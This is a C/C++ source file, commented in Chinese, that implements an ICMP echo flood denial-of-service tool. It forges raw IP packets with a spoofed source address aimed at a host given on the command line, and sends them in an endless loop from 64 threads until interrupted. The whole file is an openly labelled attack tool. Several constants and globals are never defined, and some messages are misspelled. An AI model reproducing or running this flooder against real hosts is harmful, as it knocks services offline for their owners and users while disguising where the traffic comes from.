#include<iostream>

using namespace std;

//组ICMP包
void DoS_icmp_pack(char* packet)
{
    struct ip* ip_hdr = (struct ip*)packet;
    struct icmp* icmp_hdr = (struct icmp*)(packet + sizeof(struct ip));

    ip_hdr->ip_v = 4;
    ip_hdr->ip_hl = 5;
    ip_hdr->ip_tos = 0;
    ip_hdr->ip_len = htons(ICMP_PACKET_SIZE);
    ip_hdr->ip_id = htons(getpid());
    ip_hdr->ip_off = 0;
    ip_hdr->ip_ttl = 64;
    ip_hdr->ip_p = PROTO_ICMP;
    ip_hdr->ip_sum = 0;
    ip_hdr->ip_src.s_addr = inet_addr(FAKE_IP);; //伪装源地址
    ip_hdr->ip_dst.s_addr = dest;  //填入要攻击的目的主机地址

    icmp_hdr->icmp_type = ICMP_ECHO;
    icmp_hdr->icmp_code = 0;
    icmp_hdr->icmp_cksum = htons(~(ICMP_ECHO << 8));//注意这里，因为数据部分为0，我们就简化了一下checksum的计算了
}
//搭建发包线程
void Dos_Attack()
{
    char* packet = (char*)malloc(ICMP_PACKET_SIZE);
    memset(packet, 0, ICMP_PACKET_SIZE);
    struct sockaddr_in to;
    DoS_icmp_pack(packet);

    to.sin_family = AF_INET;
    to.sin_addr.s_addr = dest;
    to.sin_port = htons(0);

    while(alive)  //控制发包的全局变量
    {
        sendto(rawsock, packet, ICMP_PACKET_SIZE, 0, (struct sockaddr*)&to, sizeof(struct sockaddr));        
    }

    free(packet);  //记得要释放内存
}
//编写发包开关
void Dos_Sig()
{
    alive = 0;
    printf("stop DoS Attack!\n");
}
int main(int argc, char* argv[])
{
    struct hostent* host = NULL;
    struct protoent* protocol = NULL;
    int i;
    alive = 1;
    pthread_t attack_thread[THREAD_MAX_NUM];  //开64个线程同时发包    
    int err = 0;

    if(argc < 2)
    {
        printf("Invalid input!\n");
        return -1;
    }

    signal(SIGINT, Dos_Sig);

    protocol = getprotobyname(PROTO_NAME);
    if(protocol == NULL)
    {
        printf("Fail to getprotobyname!\n");
        return -1;
    }

    PROTO_ICMP = protocol->p_proto;

    dest = inet_addr(argv[1]);

    if(dest == INADDR_NONE)
    {
        host = gethostbyname(argv[1]);
        if(host == NULL)
        {
            printf("Invalid IP or Domain name!\n");
            return -1;
        }
        memcpy((char*)&dest, host->h_addr, host->h_length);

    }

    rawsock = socket(AF_INET, SOCK_RAW, PROTO_ICMP);
    if(rawsock < 0)
    {
        printf("Fait to create socket!\n");
        return -1;
    }

    setsockopt(rawsock, SOL_IP, IP_HDRINCL, "1", sizeof("1"));

    printf("ICMP FLOOD ATTACK START\n");

    for(i=0;i<THREAD_MAX_NUM;i++)
    {
        err = pthread_create(&(attack_thread[i]), NULL, (void*)Dos_Attack, NULL);
        if(err)
        {
            printf("Fail to create thread, err %d, thread id : %d\n",err, attack_thread[i]);            
        }
    }

    for(i=0;i<THREAD_MAX_NUM;i++)
    {
        pthread_join(attack_thread[i], NULL);   //等待线程结束
    }

    printf("ICMP ATTACK FINISHI!\n");

    close(rawsock);

    return 0;
}